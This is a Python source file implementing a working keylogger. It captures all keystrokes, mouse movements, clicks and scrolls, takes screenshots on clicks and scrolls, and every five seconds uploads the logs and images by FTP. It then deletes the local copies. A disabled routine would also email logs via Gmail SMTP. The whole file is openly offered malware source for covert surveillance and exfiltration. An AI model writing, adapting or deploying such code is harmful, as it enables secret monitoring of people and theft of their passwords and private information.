from pynput import mouse, keyboard
import logging
import threading
from pynput.keyboard import Key
import smtplib,ssl
from datetime import datetime
from ftplib import FTP
from PIL import ImageGrab
import os
context = ssl.create_default_context()
#logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
class Keylogger:
    def __init__(self,timeinterval,email,password):
        self.timeinterval = timeinterval
        self.stopmouse = False
        self.email = email
        self.password = password
        self.log = "In da Beninging..."
        self.fh = logging.FileHandler("key_log.txt","w")
        self.formatter = logging.Formatter('%(asctime)s: %(message)s')
        self.fh.setFormatter(self.formatter)
        self.fh.setLevel(logging.DEBUG)
        self.logger = logging.getLogger()
        self.logger.setLevel(logging.DEBUG)
        self.logger.addHandler(self.fh)
        self.currentfilename = "key_log.txt"  
        self.fileuname = "testuser"
        self.filepassword = "hello"
    
    def on_move(self,x,y):
        current = self.logger.info("Mouse moved to ({0}, {1})".format(x, y))
        #self.log=self.log+current
        if self.stopmouse:
            return False
    
    def on_click(self,x,y,button,pressed):
        if pressed:
            self.getScreenshot()
            current = self.logger.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
            #self.log+=self.log+current

    def on_scroll(self,x,y,dx,dy):
        self.getScreenshot()
        current = self.logger.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
        #self.log = self.log+current

    def on_press(self,key):
        current = self.logger.info("Key pressed {}".format(str(key)))
        #self.log = self.log+current
        if(key==Key.esc):
            print("Stopping Keylogger")
            self.stopmouse=True
            return False

    def getScreenshot(self):
        im = ImageGrab.grab()
        imagefile ="Image_{}.jpg".format(datetime.now().strftime("%H_%M_%S")) 
        im.save(imagefile)
        self.send_ftp(imagefile)
        os.remove(imagefile)


    def send_mail(self,email,password,message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls(context=context)
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def send_ftp(self,filename):
        ftp = FTP('localhost')
        ftp.login(self.fileuname,self.filepassword)
        with open(filename,"rb") as file:
            ftp.storbinary("STOR "+filename,file)
        ftp.quit()
        
    def generateNewHandler(self,filename):
        self.fh = logging.FileHandler(filename,"w")
        self.fh.setFormatter(self.formatter)
        self.fh.setLevel(logging.DEBUG)
        self.logger.addHandler(self.fh)

    def deleteOldHandler(self):
        self.fh.close()
        self.logger.removeHandler(self.fh)

    def report(self):
        #self.send_mail(self.email,self.password,'\n\n'+self.log)
        self.send_ftp(self.currentfilename)
        if self.stopmouse:
            self.deleteOldHandler()
            os.remove(self.currentfilename)
            return False
        else:
            self.deleteOldHandler()
            os.remove(self.currentfilename)
            self.currentfilename = "key_log_{}.txt".format(datetime.now().strftime("%H-%M-%S"))
            self.generateNewHandler(self.currentfilename)
            self.log = ""
            print(f"Timing:{threading.activeCount()}")
            timer = threading.Timer(self.timeinterval,self.report)
            timer.start()

    def mouse_logger(self):
        with mouse.Listener(on_move=self.on_move, on_click=self.on_click,on_scroll=self.on_scroll,daemon=False) as listener:
            listener.join()

    def keyboard_logger(self):
        with keyboard.Listener(on_press=self.on_press,daemon=False) as listener:
            listener.join()

    def run(self):
        self.report()
        k=threading.Thread(target = self.keyboard_logger)
        m=threading.Thread(target=self.mouse_logger)
        k.start()
        m.start()
        k.join()
        #exit()
        m.join()


if __name__ == "__main__":
    kl = Keylogger(5, "email", "password")
    kl.run()
